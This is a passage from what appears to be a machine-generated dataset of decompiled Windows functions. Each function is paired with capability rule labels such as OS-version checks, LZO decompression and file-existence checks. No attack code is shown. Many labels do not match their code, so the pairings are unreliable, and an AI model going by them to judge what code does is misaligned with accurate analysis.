        "decompiled_code": "\nbool fcn.200198ea(void)\n\n{\n    uint lpVersionInformation;\n    uint32_t var_98h;\n    \n    sub.ntdll.dll_memset(&var_98h, 0, 0x98);\n    lpVersionInformation = 0x9c;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    return 5 < var_98h;\n}\n",
        "token_count": 89
    },
    "200016d4": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.200016d4(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint uVar1;\n    uint s;\n    uint var_3ch;\n    char16_t *var_38h;\n    ushort *var_34h;\n    ushort var_8h;\n    int32_t var_6h;\n    \n    if ((arg_8h == 0) || (arg_ch < 5)) {\n        uVar1 = 0x21590008;\n    }\n    else {\n        sub.ntdll.dll_memset(&s, 0, 0x38);\n        (*_sym.imp.ntdll.dll_wcscpy)(arg_8h, L\"\\\\??\\\\\");\n        var_6h._0_2_ = arg_ch * 2 + -8;\n        var_34h = &var_8h;\n        *0x1c = arg_8h + 8;\n        var_8h = 0;\n        var_3ch = 0x24;\n        var_38h = L\"SystemRoot\";\n        uVar1 = (*_sym.imp.ntdll.dll_RtlQueryRegistryValues)(3, 0, &s, 0, 0);\n        uVar1 = (*_sym.imp.ntdll.dll_RtlNtStatusToDosError)(uVar1);\n    }\n    return uVar1;\n}\n",
        "token_count": 310
    },
    "20007c3b": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.20007c3b(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    \n    iVar1 = fcn.20007bee(&var_10h, 0x10);\n    if (iVar1 == 0) {\n        *arg_8h = 0xfffffffd;\n    }\n    else {\n        if (iVar1 != 5) {\n            return iVar1 + 0x191U | 0x21590000;\n        }\n        *arg_8h = 0xfffffffe;\n    }\n    return 0;\n}\n",
        "token_count": 135
    },
    "20018b92": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.20018b92(uint arg_8h, uint arg_ch, uint arg_10h, uint *arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_30h;\n    uint *var_2ch;\n    uint var_28h;\n    uint s;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.WS2_32.dll_htonl;\n    var_ch = 0;\n    do {\n        iVar2 = fcn.2001863b(&var_4h, arg_14h);\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        var_8h = fcn.200135e2(var_4h, &var_10h, &var_14h, 0, 0);\n        while (var_8h == 0) {\n            fcn.20013299(var_4h, var_10h);\n            var_8h = fcn.200135e2(var_4h, &var_10h, &var_14h, 0, 0);\n        }\n        if (var_8h == 0x21590002) {\n            sub.ntdll.dll_memset(&s, 0, 0xc);\n            s = *arg_14h;\n            var_1ch = arg_ch;\n            var_18h._0_1_ = arg_18h & 1;\n            s = (*pcVar1)(s);\n            var_1ch = (*pcVar1)(var_1ch);\n            sub.ntdll.dll_memset(&var_30h, 0, 0x10);\n            var_2ch = &s;\n            var_30h = arg_10h;\n            var_28h = 0xc;\n            var_8h = fcn.20013845(var_4h, &var_30h, 0);\n            if (var_8h == 0) {\n                return 0;\n            }\n            fcn.20017cb4(*arg_14h, 0);\n            *arg_14h = 0;\n        }\n        else {\n            fcn.20017cb4(*arg_14h, 0);\n        }\n        var_ch = var_ch + 1;\n    } while (var_ch < 5);\n    return var_8h;\n}\n",
        "token_count": 586
    },
    "200239ce": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.200239ce(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = arg_ch * 8;\n    var_4h = 0;\n    var_8h = 0;\n    if (0 < iVar1) {\n        do {\n            uVar4 = 0;\n            arg_ch = 0;\n            uVar5 = var_8h;\n            do {\n                if (iVar1 <= uVar5) break;\n                uVar2 = uVar5 & 0x80000007;\n                if (uVar2 < 0) {\n                    uVar2 = (uVar2 - 1 | 0xfffffff8) + 1;\n                }\n                uVar4 = uVar4 | ((*((uVar5 + (uVar5 >> 0x1f & 7U) >> 3 & 0xffU) + arg_8h) & 1 << (uVar2 & 0x1f)) >>\n                                (uVar2 & 0x1f)) << (arg_ch & 0x1f);\n                arg_ch = arg_ch + 1;\n                uVar5 = uVar5 + 1;\n            } while (arg_ch < 5);\n            if (uVar4 == 0x1f) {\n                iVar3 = fcn.200018bf();\n                uVar4 = iVar3 % 5 + 0x1f;\n            }\n            iVar3 = var_4h + 1;\n            var_8h = var_8h + 5;\n            *(var_4h + arg_10h) = \"0123456789abcdefghijklmnopqrstuvwxyz\"[uVar4];\n            var_4h = iVar3;\n        } while (var_8h < iVar1);\n    }\n    return var_4h;\n}\n",
        "token_count": 471
    },
    "20001751": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.20001751(void)\n\n{\n    int32_t iVar1;\n    uint lpVersionInformation;\n    int32_t var_114h;\n    int32_t var_110h;\n    int32_t var_4h;\n    \n    if (*0x20046c00 == 0) {\n        lpVersionInformation = 0x114;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetVersionExW)(&lpVersionInformation);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar1 = sub.ntdll.dll_ZwQueryInformationProcess(0xffffffff, 0x1a, &var_4h, 4, 0);\n        if (iVar1 != 0) {\n            var_4h = 0;\n        }\n        if (var_114h == 4) {\n            *0x20046c00 = (var_110h == 0) + 1;\n        }\n        else if (var_114h == 5) {\n            if (var_110h == 0) {\n                *0x20046c00 = 3;\n            }\n            else if (var_110h == 1) {\n                *0x20046c00 = (-(var_4h != 0) & 10) + 9;\n            }\n            else {\n                if (var_110h != 2) {\n                    return 0;\n                }\n                *0x20046c00 = (-(var_4h != 0) & 9) + 0xe;\n            }\n        }\n        else {\n            if (var_114h != 6) {\n                return 0;\n            }\n            if (var_110h == 0) {\n                *0x20046c00 = (-(var_4h != 0) & 0xc) + 0x1b;\n            }\n            else if (var_110h == 1) {\n                *0x20046c00 = (-(var_4h != 0) & 0xc) + 0x23;\n            }\n            else {\n                if (var_110h != 2) {\n                    return 0;\n                }\n                *0x20046c00 = (-(var_4h != 0) & 0xc) + 0x26;\n            }\n        }\n    }\n    return *0x20046c00;\n}\n",
        "token_count": 525
    },
    "2000e5ed": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2000e5ed(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint *puVar7;\n    uint32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint32_t *var_ch;\n    int32_t var_8h;\n    uint32_t *var_4h;\n    \n    var_18h = 0;\n    var_20h = 0;\n    var_10h = 0;\n    var_1ch = 0;\n    var_14h = 0;\n    if (arg_8h == 0) {\n        iVar3 = 0x21590065;\n    }\n    else {\n        var_8h = (*_sym.imp.msvcrt.dll_malloc)(0x148);\n        if (var_8h == 0) {\n            iVar3 = 0x21590004;\n        }\n        else {\n            iVar3 = fcn.2000d9af(&var_10h, 0x10, arg_8h);\n            if (iVar3 == 0) {\n                var_18h = arg_ch[0xf] + arg_ch;\n                if (*(var_18h + 0x18) != 0x10b) {\n                    return 0x21590001;\n                }\n                if (var_18h == 0) {\n                    var_30h = 0;\n                }\n                else {\n                    var_30h = 0x80000000;\n                }\n                piVar6 = *(var_18h + 0x80) + arg_ch;\n                if (piVar6 != arg_ch) {\n                    iVar3 = piVar6[3];\n                    iVar5 = 0;\n                    while (iVar3 != 0) {\n                        iVar3 = fcn.2001b82a(iVar5);\n                        if (iVar3 != 0) {\n                            iVar3 = 0x21590004;\n                            goto code_r0x2000e69a;\n                        }\n                        iVar3 = fcn.2000df70(arg_8h, piVar6[3] + arg_ch, iVar5 + var_14h);\n                        if (iVar3 != 0) goto code_r0x2000e69a;\n                        var_1ch = var_1ch + 1;\n                        var_24h = var_1ch * 4;\n                        puVar1 = var_24h + -4 + var_14h;\n                        iVar3 = fcn.2000d8f1(var_10h, *puVar1, 0, var_8h, 0x40);\n                        if (iVar3 != 0) goto code_r0x2000e69a;\n                        uVar4 = *(var_8h + 0x3c);\n                        iVar3 = fcn.2000d8f1(var_10h, *puVar1 + uVar4, (uVar4 >> 0x1f) + CARRY4(*puVar1, uVar4), \n                                             var_8h + 0x40, 0xf8);\n                        if (iVar3 != 0) goto code_r0x2000e69a;\n                        if (*(var_8h + 0x58) != 0x10b) {\n                            uVar4 = *(var_8h + 0x3c);\n                            iVar3 = fcn.2000d8f1(var_10h, *puVar1 + uVar4, (uVar4 >> 0x1f) + CARRY4(*puVar1, uVar4), \n                                                 var_8h + 0x40, 0x108);\n                            if (iVar3 != 0) goto code_r0x2000e69a;\n                        }\n                        var_ch = piVar6[4] + arg_ch;\n                        var_4h = var_ch;\n                        if (*piVar6 != 0) {\n                            var_4h = *piVar6 + arg_ch;\n                        }\n                        while (uVar4 = *var_4h,  uVar4 != 0) {\n                            if ((uVar4 & var_30h) == 0) {\n                                uVar4 = uVar4 + 2 + arg_ch;\n                            }\n                            else {\n                                uVar4 = uVar4 & 0xffff;\n                            }\n                            iVar3 = fcn.20010b89(var_10h, var_8h + 0x40, *puVar1, arg_8h, *puVar1, uVar4, &var_20h, \n                                                 &var_28h);\n                            if (iVar3 != 0) goto code_r0x2000e69a;\n                            var_4h = var_4h + 1;\n                            *var_ch = var_20h;\n                            var_ch = var_ch + 1;\n                        }\n                        iVar3 = piVar6[8];\n                        iVar5 = var_24h;\n                        piVar6 = piVar6 + 5;\n                    }\n                }\n                iVar3 = 0;\n            }\ncode_r0x2000e69a:\n            fcn.2000d9e0(var_10h);\n            if (((iVar3 != 0) && (var_14h != 0)) && (var_1ch != 0)) {\n                puVar7 = var_14h + -4 + var_1ch * 4;\n                iVar5 = var_1ch;\n                do {\n                    fcn.20011537(arg_8h, *puVar7, 1);\n                    iVar5 = iVar5 + -1;\n                    puVar7 = puVar7 + -1;\n                } while (iVar5 != 0);\n            }\n            pcVar2 = _sym.imp.msvcrt.dll_free;\n            (*_sym.imp.msvcrt.dll_free)(var_14h);\n            (*pcVar2)(var_8h);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 1409
    },
    "20024882": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.20024882(int32_t *param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    \n    iVar2 = param_1[1] - param_2[1];\n    if (iVar2 == 0) {\n        iVar2 = param_1[1] + -1;\n        if (-1 < iVar2) {\n            puVar3 = *param_2 + iVar2 * 4;\n            do {\n                uVar1 = *((*param_1 - *param_2) + puVar3);\n                if (*puVar3 != uVar1) {\n                    return (-(*puVar3 < uVar1) & 2) - 1;\n                }\n                iVar2 = iVar2 + -1;\n                puVar3 = puVar3 + -1;\n            } while (-1 < iVar2);\n        }\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 224
    },
    "200248c4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.200248c4(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    \n    piVar2 = arg_8h;\n    if (arg_8h == NULL) {\n        uVar4 = arg_ch != NULL;\n    }\n    else if (arg_ch == NULL) {\n        uVar4 = 0xffffffff;\n    }\n    else {\n        iVar6 = arg_8h[3];\n        if (iVar6 == arg_ch[3]) {\n            if (iVar6 == 0) {\n                uVar3 = 1;\n                arg_8h = 0xffffffff;\n            }\n            else {\n                uVar3 = 0xffffffff;\n                arg_8h = 0x1;\n            }\n            iVar6 = piVar2[1];\n            uVar4 = uVar3;\n            if ((iVar6 <= arg_ch[1]) && (uVar4 = arg_8h,  arg_ch[1] <= iVar6)) {\n                iVar6 = iVar6 + -1;\n                if (-1 < iVar6) {\n                    puVar5 = *arg_ch + iVar6 * 4;\n                    do {\n                        uVar4 = *((*piVar2 - *arg_ch) + puVar5);\n                        uVar1 = *puVar5;\n                        if (uVar4 >= uVar1 && uVar4 != uVar1) {\n                            return uVar3;\n                        }\n                        if (uVar4 < uVar1) {\n                            return arg_8h;\n                        }\n                        iVar6 = iVar6 + -1;\n                        puVar5 = puVar5 + -1;\n                    } while (-1 < iVar6);\n                }\n                uVar4 = 0;\n            }\n        }\n        else {\n            uVar4 = (iVar6 == 0) * 2 - 1;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 461
    },
    "20024a02": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.20024a02(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    bool bVar5;\n    \n    uVar1 = *(param_2 + -4 + param_3 * 4);\n    uVar2 = *(param_1 + -4 + param_3 * 4);\n    bVar5 = uVar1 < uVar2;\n    if (uVar1 == uVar2) {\n        param_3 = param_3 + -2;\n        if (-1 < param_3) {\n            puVar4 = param_2 + param_3 * 4;\n            do {\n                uVar1 = *((param_1 - param_2) + puVar4);\n                bVar5 = *puVar4 < uVar1;\n                if (*puVar4 != uVar1) goto code_r0x20024a1c;\n                param_3 = param_3 + -1;\n                puVar4 = puVar4 + -1;\n            } while (-1 < param_3);\n        }\n        iVar3 = 0;\n    }\n    else {\ncode_r0x20024a1c:\n        iVar3 = (-bVar5 & 2) - 1;\n    }\n    return iVar3;\n}\n",
        "token_count": 315
    },
    "200274a9": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t ** __cdecl fcn.200274a9(uint32_t **arg_8h, uint32_t **arg_ch, uint32_t **arg_10h)\n\n{\n    uint32_t *arg_ch_00;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t **ppuVar3;\n    uint32_t *puVar4;\n    uint32_t *puVar5;\n    uint32_t *puVar6;\n    uint32_t *puVar7;\n    int32_t iVar8;\n    bool bVar9;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar6 = arg_10h[1];\n    arg_ch_00 = arg_ch[1];\n    if (arg_ch_00 < puVar6) {\n        ppuVar3 = NULL;\n    }\n    else {\n        ppuVar3 = arg_8h;\n        if (arg_8h[2] < arg_ch_00) {\n            ppuVar3 = fcn.2002456e(arg_8h, arg_ch_00);\n        }\n        if (ppuVar3 != NULL) {\n            puVar4 = *arg_ch;\n            puVar7 = *arg_10h;\n            puVar5 = *arg_8h;\n            bVar9 = false;\n            arg_ch = NULL;\n            arg_10h = puVar6;\n            if (0 < puVar6) {\n                do {\n                    uVar1 = *puVar4;\n                    uVar2 = *puVar7;\n                    puVar4 = puVar4 + 1;\n                    puVar7 = puVar7 + 1;\n                    if (bVar9) {\n                        bVar9 = uVar1 <= uVar2;\n                        iVar8 = -1 - uVar2;\n                    }\n                    else {\n                        bVar9 = uVar1 < uVar2;\n                        iVar8 = -uVar2;\n                    }\n                    *puVar5 = uVar1 + iVar8;\n                    puVar5 = puVar5 + 1;\n                    arg_10h = arg_10h + -1;\n                } while (arg_10h != NULL);\n                arg_ch = puVar6;\n                if (bVar9) {\n                    do {\n                        if (arg_ch_00 <= arg_ch) break;\n                        uVar2 = *puVar4;\n                        arg_ch = arg_ch + 1;\n                        uVar1 = uVar2 - 1;\n                        *puVar5 = uVar1;\n                        puVar4 = puVar4 + 1;\n                        puVar5 = puVar5 + 1;\n                    } while (uVar2 <= uVar1);\n                }\n            }\n            if (puVar5 != puVar4) {\n                while (arg_ch < arg_ch_00) {\n                    *puVar5 = *puVar4;\n                    if (arg_ch_00 <= arg_ch + 1) break;\n                    puVar5[1] = puVar4[1];\n                    iVar8 = arg_ch + 3;\n                    if (arg_ch_00 <= arg_ch + 2) break;\n                    puVar5[2] = puVar4[2];\n                    arg_ch = arg_ch + 1;\n                    if (arg_ch_00 <= iVar8) break;\n                    puVar5[3] = puVar4[3];\n                    puVar5 = puVar5 + 4;\n                    puVar4 = puVar4 + 4;\n                }\n            }\n            arg_8h[1] = arg_ch_00;\n            if (0 < arg_ch_00) {\n                puVar6 = *arg_8h + arg_ch_00 + -1;\n                do {\n                    uVar1 = *puVar6;\n                    puVar6 = puVar6 + -1;\n                    if (uVar1 != 0) break;\n                    arg_8h[1] = arg_8h[1] + -1;\n                } while (0 < arg_8h[1]);\n            }\n            ppuVar3 = 0x1;\n        }\n    }\n    return ppuVar3;\n}\n",
        "token_count": 903
    },
    "2002b2f5": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t fcn.2002b2f5(int32_t *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint16_t *puVar3;\n    \n    uVar2 = 0;\n    iVar1 = param_1[1] + -1;\n    if (-1 < iVar1) {\n        puVar3 = *param_1 + iVar1 * 4;\n        do {\n            uVar2 = ((puVar3[1] | uVar2 << 0x10) % param_2 << 0x10 | *puVar3) % param_2;\n            iVar1 = iVar1 + -1;\n            puVar3 = puVar3 + -2;\n        } while (-1 < iVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 186
    },
    "2002b5f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.2002b5f0(int32_t *arg_8h, int32_t *arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint *puVar7;\n    uint32_t *puVar8;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h[3] = arg_ch[3];\n    iVar4 = arg_10h + (arg_10h >> 0x1f & 0x1fU) >> 5;\n    iVar1 = arg_ch[1] + 1 + iVar4;\n    piVar6 = arg_8h;\n    if (arg_8h[2] < iVar1) {\n        piVar6 = fcn.2002456e(arg_8h, iVar1);\n    }\n    if (piVar6 != NULL) {\n        arg_10h = arg_10h & 0x8000001f;\n        if (arg_10h < 0) {\n            arg_10h = (arg_10h - 1 | 0xffffffe0) + 1;\n        }\n        iVar1 = *arg_8h;\n        iVar2 = *arg_ch;\n        *(iVar1 + (arg_ch[1] + iVar4) * 4) = 0;\n        if (arg_10h == 0) {\n            iVar5 = arg_ch[1] + -1;\n            if (-1 < iVar5) {\n                puVar7 = iVar1 + (iVar4 + iVar5) * 4;\n                do {\n                    *puVar7 = *(iVar2 + iVar5 * 4);\n                    iVar5 = iVar5 + -1;\n                    puVar7 = puVar7 + -1;\n                } while (-1 < iVar5);\n            }\n        }\n        else {\n            iVar5 = arg_ch[1] + -1;\n            if (-1 < iVar5) {\n                puVar8 = iVar1 + 4 + (iVar4 + iVar5) * 4;\n                do {\n                    uVar3 = *(iVar2 + iVar5 * 4);\n                    *puVar8 = *puVar8 | uVar3 >> (0x20 - arg_10h & 0x1f);\n                    puVar8 = puVar8 + -1;\n                    *puVar8 = uVar3 << (arg_10h & 0x1f);\n                    iVar5 = iVar5 + -1;\n                } while (-1 < iVar5);\n            }\n        }\n        sub.ntdll.dll_memset(iVar1, 0, iVar4 << 2);\n        iVar4 = arg_ch[1] + 1 + iVar4;\n        arg_8h[1] = iVar4;\n        if (0 < iVar4) {\n            piVar6 = *arg_8h + -4 + iVar4 * 4;\n            do {\n                iVar1 = *piVar6;\n                piVar6 = piVar6 + -1;\n                if (iVar1 != 0) break;\n                arg_8h[1] = arg_8h[1] + -1;\n            } while (0 < arg_8h[1]);\n        }\n        piVar6 = 0x1;\n    }\n    return piVar6;\n}\n",
        "token_count": 766
    },
    "20001e44": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20001e44(int16_t *arg_8h, int32_t arg_ch, int32_t s, uint32_t arg_14h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar4 = arg_14h;\n    if (arg_14h == 0) {\n        iVar4 = 0x2002d456;\n    }\n    iVar2 = sub.ntdll.dll_strcmp(0x20034110, iVar4);\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.msvcrt.dll_setlocale)(2, iVar4);\n        if (iVar2 == 0) {\n            var_4h = 0xffffffff;\n        }\n        else {\n            (*_sym.imp.ntdll.dll_strncpy)(0x20034110, iVar4, 0x20);\n        }\n    }\n    iVar1 = *arg_8h;\n    uVar3 = 0;\n    if (s == -1) {\n        while (iVar1 != 0) {\n            iVar4 = (*_sym.imp.msvcrt.dll_wctomb)(uVar3 + arg_ch, iVar1);\n            if (iVar4 == 0) break;\n            if (iVar4 == -1) {\n                *(uVar3 + arg_ch) = 0x3f;\n                iVar4 = 1;\n            }\n            arg_8h = arg_8h + 1;\n            uVar3 = uVar3 + iVar4;\n            iVar1 = *arg_8h;\n        }\n    }\n    else if (iVar1 != 0) {\n        arg_14h = s - 1;\n        do {\n            if (arg_14h <= uVar3) break;\n            iVar4 = (*_sym.imp.msvcrt.dll_wctomb)(&s, iVar1);\n            if (iVar4 == -1) {\n                iVar4 = 1;\n            }\n            if (arg_14h < iVar4 + uVar3) break;\n            iVar4 = (*_sym.imp.msvcrt.dll_wctomb)(uVar3 + arg_ch, *arg_8h);\n            if (iVar4 == 0) break;\n            if (iVar4 == -1) {\n                *(uVar3 + arg_ch) = 0x3f;\n            }\n            arg_8h = arg_8h + 1;\n            iVar1 = *arg_8h;\n            uVar3 = uVar3 + 1;\n        } while (iVar1 != 0);\n    }\n    *(uVar3 + arg_ch) = 0;\n    return var_4h;\n}\n",
        "token_count": 607
    },
    "20001f33": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20001f33(int16_t *arg_8h, int32_t s)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = s;\n    if (s == 0) {\n        iVar2 = 0x2002d456;\n    }\n    iVar1 = sub.ntdll.dll_strcmp(0x20034110, iVar2);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.msvcrt.dll_setlocale)(2, iVar2);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        (*_sym.imp.ntdll.dll_strncpy)(0x20034110, iVar2, 0x20);\n    }\n    iVar2 = 0;\n    while ((*arg_8h != 0 && (iVar1 = (*_sym.imp.msvcrt.dll_wctomb)(&s, *arg_8h),  iVar1 != 0))) {\n        if (iVar1 == -1) {\n            iVar1 = 1;\n        }\n        arg_8h = arg_8h + 1;\n        iVar2 = iVar2 + iVar1;\n    }\n    return iVar2 + 1;\n}\n",
        "token_count": 270
    },
    "200025cc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.200025cc(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetFileSize)(arg_8h, &var_4h);\n    return uVar1;\n}\n",
        "token_count": 65
    },
    "200025e6": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.200025e6(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t var_4h;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(arg_8h, arg_14h, 0, 0);\n    if ((iVar1 != -1) && (iVar1 = (*_sym.imp.KERNEL32.dll_ReadFile)(arg_8h, arg_ch, arg_10h, &var_4h, 0),  iVar1 != 0))\n    {\n        return (var_4h == arg_10h) - 1;\n    }\n    return -1;\n}\n",
        "token_count": 168
    },
    "2000262a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2000262a(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t var_4h;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(arg_8h, arg_14h, 0, 0);\n    if ((iVar1 != -1) && (iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_8h, arg_ch, arg_10h, &var_4h, 0),  iVar1 != 0))\n    {\n        return (var_4h == arg_10h) - 1;\n    }\n    return -1;\n}\n",
        "token_count": 168
    },
    "200031c9": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.200031c9(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4ch;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    uVar1 = fcn.20002de0(&var_4h, 5);\n    if (uVar1 == 0) {\n        fcn.20002847();\n        fcn.20002744(arg_ch, arg_10h, arg_14h);\n        iVar2 = fcn.20002965();\n        if (iVar2 == -1) {\n            uVar1 = 5;\n        }\n        else {\n            iVar3 = (**(*(var_4h + 0x44) + 0x14))(*(var_4h + 0x48), &var_4ch, 0x40, iVar2);\n            if (iVar3 == 0) {\n                var_2ch = arg_18h;\n                var_28h = arg_1ch;\n                var_24h = arg_20h;\n                iVar2 = (**(*(var_4h + 0x44) + 0x18))(*(var_4h + 0x48), &var_4ch, 0x40, iVar2);\n                uVar1 = -(iVar2 != 0) & 3;\n            }\n            else {\n                uVar1 = 3;\n            }\n        }\n        fcn.20002815();\n    }\n    return uVar1;\n}\n",
        "token_count": 400
    },
    "20003275": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.20003275(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4ch;\n    uint var_1ch;\n    uint var_ch;\n    int32_t var_4h;\n    \n    uVar1 = fcn.20002de0(&var_4h, 5);\n    if (uVar1 == 0) {\n        fcn.20002847();\n        fcn.20002744(arg_ch, arg_10h, arg_14h);\n        iVar2 = fcn.20002965();\n        if (iVar2 == -1) {\n            uVar1 = 5;\n        }\n        else {\n            iVar3 = (**(*(var_4h + 0x44) + 0x14))(*(var_4h + 0x48), &var_4ch, 0x40, iVar2);\n            if (iVar3 == 0) {\n                var_1ch = 0;\n                iVar2 = (**(*(var_4h + 0x44) + 0x18))(*(var_4h + 0x48), &var_4ch, 0x40, iVar2);\n                uVar1 = -(iVar2 != 0) & 3;\n            }\n            else {\n                uVar1 = 3;\n            }\n        }\n        fcn.20002815();\n    }\n    return uVar1;\n}\n",
        "token_count": 343
    },
    "2000330f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
